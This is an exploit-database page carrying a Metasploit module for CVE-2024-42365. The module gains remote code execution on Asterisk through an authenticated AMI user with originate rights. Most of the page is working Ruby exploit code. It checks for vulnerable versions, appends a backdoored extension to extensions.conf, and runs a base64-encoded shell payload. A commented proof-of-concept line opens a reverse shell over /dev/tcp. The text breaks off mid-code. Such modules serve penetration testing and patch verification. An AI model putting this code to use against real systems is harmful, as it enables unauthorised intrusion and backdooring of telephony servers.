---
title: Asterisk AMI Originate Authenticated Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024120001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-12-04
fetch_date: 2025-10-06T19:37:03.273668
---

# Asterisk AMI Originate Authenticated Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Asterisk AMI Originate Authenticated Remote Code Execution** **2024.12.03**  Credit:  **[h00die](https://cxsecurity.com/author/h00die/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = GreatRanking
include Msf::Exploit::Remote::Asterisk
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Asterisk AMI Originate Authenticated RCE',
'Description' => %q{
On Asterisk, prior to versions 18.24.2, 20.9.2, and 21.4.2 and certified-asterisk
versions 18.9-cert11 and 20.7-cert2, an AMI user with 'write=originate' may change
all configuration files in the '/etc/asterisk/' directory. Writing a new extension
can be created which performs a system command to achieve RCE as the asterisk service
user (typically asterisk).
Default parking lot in FreePBX is called "Default lot" on the website interface,
however its actually 'parkedcalls'.
Tested against Asterisk 19.8.0 and 18.16.0 on Freepbx SNG7-PBX16-64bit-2302-1.
},
'Author' => [
'Brendan Coles <bcoles[at]gmail.com>', # lots of AMI command stuff
'h00die', # msf module
'NielsGaljaard' # discovery
],
'References' => [
['URL', 'https://github.com/asterisk/asterisk/security/advisories/GHSA-c4cg-9275-6w44'],
['CVE', '2024-42365']
],
'Platform' => 'unix',
# leaving this for future travelers. I was still not getting 100% payload compatibility
# so there seems to still be another character or two bad, but b64 fixed it.
# 'Payload' => {
# # ; is a comment in the extensions.conf file
# 'BadChars' => ";\r\n:\"" # https://docs.asterisk.org/Configuration/Interfaces/Asterisk-Manager-Interface-AMI/AMI-v2-Specification/#message-layout
# },
# 927 characters (w/o padding) is the max (Error, Message: Failed to parse message: line too long)
# `echo "" | base64 -d | sh` == 19 characters
# chatGPT says 908 b64 encoded characters makes 681 pre-encoding.
'Payload' => {
'Space' => 681
},
'Targets' => [
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_command
}
],
],
'Privileged' => false,
'DisclosureDate' => '2024-08-08',
'Notes' => {
'Stability' => [ CRASH\_SAFE ],
'SideEffects' => [ IOC\_IN\_LOGS, CONFIG\_CHANGES],
'Reliability' => [ REPEATABLE\_SESSION ]
},
'DefaultTarget' => 0,
'License' => MSF\_LICENSE
)
)
register\_options [
OptString.new('CONF', [true, 'The extensions configuration file location', '/etc/asterisk/extensions.conf']),
OptString.new('PARKINGLOT', [true, 'The extensions and name of the parking lot', '70@parkedcalls']),
OptString.new('EXTENSION', [true, 'The extension number to backdoor', Rex::Text.rand\_text\_numeric(3..5)]),
]
register\_advanced\_options [
OptInt.new('TIMEOUT', [true, 'Timeout value between AMI commands', 1]),
]
end
def conn?
vprint\_status 'Connecting...'
connect
banner = sock.get\_once
unless banner =~ %r{Asterisk Call Manager/([\d.]+)}
print\_bad('Asterisk Call Manager does not appear to be running')
return false
end
print\_status "Found Asterisk Call Manager version #{::Regexp.last\_match(1)}"
unless login(datastore['USERNAME'], datastore['PASSWORD'])
print\_bad('Authentication failed')
return false
end
print\_good 'Authenticated successfully'
true
rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
print\_error e.message
false
end
def check
# why don't we check the version numbers?
# we're connecting to Asterisk Call Manager, which seems to be a sub component
# of asterisk and therefore the version numbers don't line up. For instance
# Asterisk 19.8.0 (provided by freepbx SNG7-PBX16-64bit-2302-1.iso)
# uses Asterisk Call Manager version 8.0.2.
return CheckCode::Unknown('Unable to connect to Asterisk AMI service') unless conn?
version = get\_asterisk\_version
disconnect
return CheckCode::Detected('Able to connect, unable to determine version') if !version
if version.between?(Rex::Version.new('18.16.0'), Rex::Version.new('18.24.2')) ||
version.between?(Rex::Version.new('19'), Rex::Version.new('20.9.2')) ||
version.between?(Rex::Version.new('21'), Rex::Version.new('21.4.2')) ||
version.to\_s.include?('cert') &&
(
version.between?(Rex::Version.new('18.0-cert1'), Rex::Version.new('18.9-cert11')) ||
version.between?(Rex::Version.new('19.0-cert1'), Rex::Version.new('20.7-cert2'))
)
return Exploit::CheckCode::Appears("Exploitable version #{version} found")
end
return Exploit::CheckCode::Safe("Unexploitable version #{version} found")
end
def exploit
fail\_with(Failure::NoAccess, 'Unable to connect or authenticate') unless conn?
new\_context = rand\_text\_alpha(8..12)
print\_status("Using new context name: #{new\_context}")
print\_status('Loading conf file')
req = "Action: Originate\r\n"
req << "Channel: Local/#{datastore['PARKINGLOT']}\r\n"
req << "Application: SET\r\n"
req << "Data: FILE(#{datastore['CONF']},,,al)=[#{new\_context}]\r\n"
req << "\r\n"
res = send\_command req
res = res.strip.gsub("\r\n", ', ')
if res.include?('Response: Error')
disconnect
fail\_with(Failure::UnexpectedReply, "#{res}. This may be due to lack of permissions, a not vulnerable version, or an incorrect PARKINGLOT")
end
vprint\_good(" #{res}")
# since commands are queued, sleeping 1 second is needed for the job to
# execute. This is mentioned in the original writeup: "(you might need to take some time between them)."
Rex.sleep(datastore['TIMEOUT'])
print\_status('Setting backdoor')
req = "Action: Originate\r\n"
req << "Channel: Local/#{datastore['PARKINGLOT']}\r\n"
req << "Application: SET\r\n"
# from the PoC
# req << "Data: FILE(#{datastore['CONF']},,,al)=exten => #{datastore['EXTENSION']},1,System(/bin/bash -c 'sh -i >& /dev/tcp/127.0.0.1/4444 0>&1')\r\n"
req << "Data: FILE(#{datastore['CONF']},,,al)=exten => #{datastore['EXTENSION']},1,System(echo \"#{Base64.strict\_encode64(payload.encoded).gsub("\n", '')}\" | base64 -d | sh)\r\n"
req << "\r\n"
res = send\_command req
res = res.strip.gsub("\r\n", ', ')
if res.include...